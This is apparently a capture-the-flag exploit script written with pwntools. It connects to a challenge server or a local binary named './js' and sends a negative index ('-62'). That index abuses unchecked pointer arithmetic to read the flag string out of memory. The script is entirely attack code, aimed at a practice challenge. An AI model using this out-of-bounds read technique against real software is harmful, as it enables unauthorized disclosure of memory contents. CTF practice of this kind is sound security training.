#!/usr/bin/python3

from pwn import *

PROG_NAME = "./js"
REMOTE_IP = "pwn.ctf.secso.cc"
REMOTE_PORT = 5002

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvuntil("+ ")
p.recvuntil("+ ")

# add a negative offset to access flag string
# pointer arithmetic go brrrrr
p.sendline("-62")

flag = p.recvuntil("}")[10:]
p.sendline("yes")
p.sendline("lol")

print("flag is", flag)
